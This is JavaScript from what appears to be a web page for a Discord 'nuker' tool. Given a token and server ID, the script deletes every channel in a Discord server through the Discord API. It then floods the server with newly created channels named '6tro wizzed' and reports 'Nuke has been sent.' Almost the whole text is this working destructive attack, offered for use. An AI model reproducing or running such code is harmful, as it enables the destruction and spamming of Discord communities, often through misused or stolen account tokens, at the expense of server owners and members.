  <script>
       function sayHello() {
         if (document.getElementById("glockak").checked == true) {
            let noobb = new XMLHttpRequest();
            var url = "https://discord.com/api/v8/guilds/"+ document.getElementById("inputServer").value+"/channels";
            console.log(url)
            noobb.open("GET", url, true);
            noobb.setRequestHeader("authorization", document.getElementById("inputToken").value);

            noobb.send(null);
            
            noobb.onload=function()
            {
              var result = JSON.parse(noobb.responseText)
              for( let prop in result ){
              let xxhr = new XMLHttpRequest();
              var url = "https://discord.com/api/v8/channels/"+result[prop].id ;
              xxhr.open("DELETE", url, true);
              xxhr.setRequestHeader("authorization", document.getElementById("inputToken").value);
              xxhr.send(null);
              console.log(xxhr.responseText)
              }
              
              for (i = 0; i < document.getElementById("inputChannel").value; i++) {
                let xhr = new XMLHttpRequest();
                var url = "https://discord.com/api/v8/guilds/"+ document.getElementById("inputServer").value+"/channels";
                var params = {"type":0,"name":"6tro wizzed"}

                xhr.open("POST", url, true);

                xhr.setRequestHeader("authorization", document.getElementById("inputToken").value);
                xhr.setRequestHeader('Content-Type', 'application/json')

                xhr.send(JSON.stringify(params));
              }
            }
      
          alert("Nuke has been sent.")
         }
         else
         {
          alert("Please agree to Terms & Conditions")
         }
         return false
       }
